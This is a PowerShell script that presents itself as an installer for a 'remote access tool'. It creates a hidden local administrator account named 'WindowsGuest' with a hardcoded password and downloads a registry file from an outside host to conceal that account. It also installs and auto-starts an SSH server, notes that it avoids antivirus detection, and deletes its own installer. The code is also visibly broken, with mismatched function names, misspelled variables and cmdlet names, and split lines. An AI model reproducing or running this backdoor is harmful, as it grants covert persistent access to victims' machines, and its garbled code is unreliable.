# builds resources for remote access tool

# random string for directories
function random_text{
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function create_account {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Passwrod -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# go to temp. make a working directory
mkdir $path
cd $path

# create admin user
Remove-LocalUser -Name "WindowsGuest"
$NewLocalAdmin = "WindowsGuest"
$String = RpLGWiUsIy
$Password = (ConvertTo-SecureString $String -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# create registery to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
"$reg_file.reg"

# visual basic script to register the registery
./"$reg_file.reg";"vbs_file.vbs"

# dont disable wdef until need to, not av detectable up until here

Add-WindowsCapability -Online 
-Name OpenSSG.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd
-StartupTpe 'Automatic'
Get-NetFireWallRule -Name *ssh*

cd $initial_dir
del rat_installer.ps1